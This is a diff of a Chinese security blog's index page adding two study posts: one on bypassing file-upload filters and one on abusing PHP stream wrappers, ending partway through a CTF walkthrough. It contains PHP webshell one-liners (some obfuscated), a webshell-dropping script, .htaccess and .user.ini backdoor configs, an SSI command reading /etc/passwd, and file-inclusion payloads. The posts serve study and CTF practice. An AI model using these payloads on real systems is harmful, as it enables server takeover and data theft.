@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,368 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/" class="post-title-link" itemprop="url">文件上传（总结和缝合）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-03 20:39:43 / 修改时间：20:44:26" itemprop="dateCreated datePublished" datetime="2022-04-03T20:39:43+08:00">2022-04-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>写在前面：</p>
+<p>文件上传漏洞常用于获取<code>webshell</code>，从而取得对目标网站(系统)的控制权。要获取<code>shell</code>，需要： 1.知道上传后文件所保存位置(不知道那就猜、爆破，一般是能知道的) 2.上传后文件的名字(是否被更改) </p>
+<p>一句话木马(webshell):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;passwd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>一句话木马原理及不同类型：<code>https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin</code></p>
+<p>毫无过滤</p>
+<ul>
+<li><p>直接上传即可获取<code>webshell</code><br>两种校验方式</p>
+</li>
+<li><p>客户端校验(javascript校验)</p>
+</li>
+<li><p>服务端校验<br>客户端校验：</p>
+</li>
+</ul>
+<p>绕过方法</p>
+<ul>
+<li><p>抓包改包</p>
+</li>
+<li><p>禁用JS<br>禁用JS</p>
+</li>
+<li><p>如果是弹窗提示，打开控制台-&gt;网络，上传时没有请求发出去，说明是在本地校验</p>
+</li>
+<li><p>火狐插件-yescript2</p>
+</li>
+<li><p>老版本可以使用WebDeveloper<br>抓包改包</p>
+</li>
+<li><p>用bp抓包后直接改后缀名<br>绕过js过滤：</p>
+</li>
+</ul>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传jpg、png、gif结尾的图片噢！&quot;;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：</p>
+<ul>
+<li>在控制台重新定义函数 <code>function checkFile()&#123;&#125;</code> 回车即可(<strong>注：需要在未触发该函数前</strong>) </li>
+<li>将一句话木马文件后缀改为<code>.png .jpg .gif</code>后，点击上传。用<code>BurpSuite</code>截断，然后将文件名再替换成<code>.php</code><br>后端过滤：</li>
+</ul>
+<p>利用解析漏洞绕过</p>
+<pre><code>* `IIS`解析漏洞
+</code></pre>
+<blockquote>
+<p>IIS 6.0在解析文件时存在以下两个解析漏洞。<br>当建立*.asa、*.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件来解析。<br>例如：建立文件夹parsing.asp，在parsing.asp文件夹内新建一个文本文档test.txt，其内容为&lt;%=NOW()%&gt;，然后在浏览器内访问。<br>“NOWO”是ASP提供获取当前时间的函数，TXT是文本文档格式，IIS是不会去解析此类文件的，应该会直接显示其内容，而在parsing.asp文件夹中，却被当作ASP脚本来解析。<br>当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行，如：新建文件test.asp;1.jpg，内容为&lt;%=NOW()%&gt;。<br>    * <code>Apache</code>解析漏洞<br>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php。<br>怎么去判断是不是合法的后缀就是这个漏洞利用关键，测试时把常见的后缀都写上，去测试是不是合法，任意不识别的后缀，逐级向上识别。<br>有些程序开发人员在上传文件时，判断文件名是否是PHP、ASP、ASPX、ASA、CER、ASPX等脚本扩展名，如果是，则不允许上传，这时攻击者就有可能上传1.php.rar等扩展名来绕过程序检测，并配合解析漏洞，获取到WebShell。<br>    * <code>Nginx</code>解析漏洞<br>解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php<br>描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br>还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
+</blockquote>
+<h3 id><a href="#" class="headerlink" title></a></h3><p>猜测过滤规则绕过：</p>
+<ul>
+<li><p>文件后缀名黑名单：</p>
+</li>
+<li><p>大小写绕过 <code>Php、PhP···</code></p>
+</li>
+<li><p>利用能被解析的后缀名，例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p>
+</li>
+<li><p>配合Apache的.htaccess文件上传解析，该文件可以理解为Apache的分布式配置文件，在一个特定的文档中放置，以作用于此目录及其所有子目录。管理员可以通过Apache的AllowOverride指令来设置<code>/etc/apache2/apache2.conf</code>，默认是NONE，需要为ALL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMacth&gt;  </span><br></pre></td></tr></table></figure>
+<p>假如不能写<code>&lt;?</code>时使用伪协议 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .123</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.123&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>.user.ini</code>上传<br>条件：</p>
+</li>
+<li><p>1、服务器脚本语言为PHP</p>
+</li>
+<li><p>2、服务器使用CGI／FastCGI模式</p>
+</li>
+<li><p>3、上传目录下要有可执行的php文件<br>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache </p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11455355.html#%E5%88%A9%E7%94%A8.user.ini%E4%B8%8A%E4%BC%A0%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8">刷题记录：[SUCTF 2019]CheckIn</a></p>
+<ul>
+<li><p>使用00截断（需要magic_quotes_gpc=Off）<br>基于一个组合逻辑漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = getname(http request)//假如这时候获取到的文件名是test.asp.jpg(asp后面为0x00)</span><br><span class="line">type = gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</span><br><span class="line">if(type==jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name,name)</span><br></pre></td></tr></table></figure>
+<p>在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00</p>
+</li>
+<li><p>超长文件名截断上传(windows 258byte | linux 4096byte)<br>使用./或.</p>
+</li>
+<li><p><code>shtml</code><br>当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持<br><code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></p>
+</li>
+<li><p> MIME类型绕过</p>
+<blockquote>
+<p><code>BurpSuite</code>抓包,更改<code>content-type</code>请求头为<code>image/gif、image/png、image/jpg</code></p>
+</blockquote>
+</li>
+<li><p> 图片马内容检测<br>根据过滤内容来调整,例如&lt;?被过滤，调整为<code>&lt;% eval request(&quot;123&quot;)%&gt;</code>等等 </p>
+</li>
+<li><p>文件内容头检测<br>上述方法均失效时可以考虑一下网站是否检测了文件头</p>
+</li>
+</ul>
+<p>解决方法1：添加图片文件头到木马文件</p>
+<p><code>GIF89a? &lt;% eval request(&quot;123&quot;)%&gt;</code></p>
+<p>文件头对照参考：<code>https://blog.csdn.net/rrrfff/article/details/7484109</code></p>
+<p>解决方法2：将一张图片与一句话木马文件结合</p>
+<p>1.记事本打开图片，在末尾或者之中添加一句话木马 2.使用命令将图片与木马文件结合 </p>
+<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html">https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例子：GIF89a</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>竞争上传<br>文件上传后，网站系统会对文件进行恶意代码检测，若是存在恶意代码，则会删除该文件</li>
+</ul>
+<p>若在这个操作的时间之内，访问该上传的文件，利用之间的时间差来获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &#x27;web.php&#x27;;</span><br><span class="line">$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;</span><br><span class="line">file_put_contents($file,$shell);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>.user.ini</code> 利用 (注：上传目录下要有可执行的<code>php</code>文件，一般是自带的，而不是自己上传的，要是可以的话，还需要这么多骚操作干什么)<br>大佬教程：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p> 例子</p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/backlion/demo/blob/master/lfi_phpinfo.py">https://github.com/backlion/demo/blob/master/lfi_phpinfo.py</a></p>
+<ul>
+<li><p>Apache的.htaccess<br>教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hmbb/p/9689436.html">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
+</li>
+<li><p>php崩溃导致tmp文件保留<br>当存在<code>include</code>的时候，传入<code>file=php://filter/string.strip_tags/resource=/etc/passwd</code>会导致Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。但是这时还需要知道tmp目录下的文件名 </p>
+</li>
+<li><p>过滤<code>&lt;?</code>或<code>php</code><br>js标签绕过，需要php小于7.0</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;</span><br><span class="line">$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#x27;r&#x27;);</span><br><span class="line">echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));</span><br><span class="line">fclose($fh);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量，在PHP 5.4 之后默认支持<br>常见的一句话木马(PHP):</p>
+<ul>
+<li><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code> <strong>比较好用</strong></li>
+<li><code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code></li>
+<li><code>&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入&quot;h=@eval($_POST[c]);&quot;</code></li>
+<li><code>&lt;?php $c=&#39;ass&#39;.&#39;ert&#39;;$&#123;c&#125;($_POST[4]);?&gt;</code></li>
+</ul>
+<p>常见文件名对应的MIME类型：</p>
+<pre><code>* 扩展名：gif MIME类型：image/gif
+* 扩展名：png MIME类型：image/png
+* 扩展名：jpg MIME类型：image/jpg
+* 扩展名：js MIME类型：text/javascript
+* 扩展名：htm MIME类型：text/html
+* 扩展名：html MIME类型：text/html
+</code></pre>
+<p>参考网站：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42636435/article/details/88096844">https://blog.csdn.net/qq_42636435/article/details/88096844</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7531">https://xz.aliyun.com/t/7531</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/10989689.html">https://www.cnblogs.com/20175211lyz/p/10989689.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893">https://blog.csdn.net/weixin_39190897/article/details/85334893</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/" class="post-title-link" itemprop="url">伪协议php(总结和缝合）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-03 15:56:14 / 修改时间：20:44:15" itemprop="dateCreated datePublished" datetime="2022-04-03T15:56:14+08:00">2022-04-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>分类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">file:// — 访问本地文件系统</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+<p><strong>PHP.ini（配置文件）</strong><br>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include</p>
+<p>allow_url_fopen:默认值是ON，允许url里的封装协议访问文件</p>
+<p>allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
+<p>file:</p>
+<p>用于访问本地文件，不受allow_url_fopen，<code>file://</code>还经常和curl函数(SSRF)结合在一起,受allow_url_include影响</p>
+<p><a href="file://主要用于访问文件（绝对路径，相对路径和网络路径）">file://主要用于访问文件</a>（绝对路径和网络路径）</p>
+<p>比如：</p>
+<p>url?file=<a href="file:///etc/password">file:///etc/password</a></p>
+<p>php://：</p>
+<p>在allow_url_fopen,allow_url_include都关闭的情况下可以正常使用</p>
+<p>php://作用为访问输出和输入</p>
+<p>php://filter</p>
+<p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</p>
+<p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</p>
+<p>读取源代码并进行编码然后输出</p>
+<p>比如：</p>
+<p>url?cmd=php://filter/read=convert.base64-encode/resource=文件名（php文件需要用base64编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-[encode/decode]/resource=xxx</span><br></pre></td></tr></table></figure>
+<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取文件的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据<br>说明：</p>
+<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流</p>
+<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</span><br></pre></td></tr></table></figure>
+<p>filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(),write用于file_put_contents()中<br>php://input</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p>需要开启allow_url_include</p>
+<p>执行post数据中的代码：</p>
+<p>比如：</p>
+<p>url?cmd=php://input</p>
+<p>post数据：<?php phpinfo()?></p>
+<p>注意：</p>
+<p>当enctype=”multipart/form-data”的时候，php://input是无效的</p>
+<p>data://</p>
+<p>当php&gt;=5.2.0，可以使用data://,来传递相应格式的数据。通常用来执行php代码。一般用base64编码传输,需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用 </p>
+<p>比如：</p>
+<p>通过data://text/plain协议来进行漏洞利用</p>
+<p>data://text/plain;base64,base编码字符串</p>
+<p>很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<p>phar://</p>
+<p>PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://test.[zip/jpg/png…]/file.txt</span><br></pre></td></tr></table></figure>
+<p>其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。<br>当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php</span><br></pre></td></tr></table></figure>
+
+<p>zip://,bzip2://, zlib://</p>
+<p>在双OFF的时候也可以用，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://test.zip%23file.txt</span><br></pre></td></tr></table></figure>
+<p>和phar://一样用于读取压缩文件，不过对于”zip://test.zip#file.txt”中的”#”要编码为”%23”.因为url的#后的内容不会被传送<br>zip://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br><span class="line">file.php?file=zip://nac.jpg#nac.php  其中get请求中#需要进行编码，即%23</span><br></pre></td></tr></table></figure>
+
+<p>bzip2://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=compress.bzip2://nac.bz2</span><br><span class="line">file.php?file=compress.bzip2://./nac.jpg</span><br><span class="line">file.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</span><br></pre></td></tr></table></figure>
+
+<p>zlib://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=compress.zlib://file.gz</span><br><span class="line">file.php?file=compress.zlib://./nac.jpg</span><br><span class="line">file.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<p>[ZJCTF 2019]NiZhuanSiWei</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码让我们get传参text，file，password<br>经过观察可以确定text要传入一个文件，且文件内容为：welcome to the zjctf，file传入一个文件名。然后通过include($file）包含，password暂且不知</p>
+<p>伪协议第一次利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br></pre></td></tr></table></figure>
+<p>这里需要我们传入一个文件且其内容为<code>welcome to the zjctf</code>,才可以进入判断进行下一步<br>由于：在官方手册中file_get_contents()是用来将文件的内容读入到一个字符串中的首选方法 </p>
+<p>官方实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(&#x27;http://www.xxx.com/aa.png&#x27;, &#x27;r&#x27;);</span><br><span class="line">// 将会在该页面中输出图片</span><br></pre></td></tr></table></figure>
+<p>可以发现，file_get_contents的$filename参数不仅仅可以是本地文件路径，也可以是一个网络路径即url,所以我们可以考虑使用伪协议</p>
+<ul>
+<li>姿势一：<code>data://</code>协议利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line">// d2VsY29tZSB0byB0aGUgempjdGY= 解码后为 -----&gt;  welcome to the zjctf</span><br></pre></td></tr></table></figure></li>
+<li>姿势二：<code>php://</code>协议利用<br>php://input</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">url：http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn/?text=php://input</span><br><span class="line">POST数据：welcome to the zjctf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST请求包：</span><br><span class="line">POST /?text=php://input HTTP/1.1</span><br><span class="line">Host: a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span 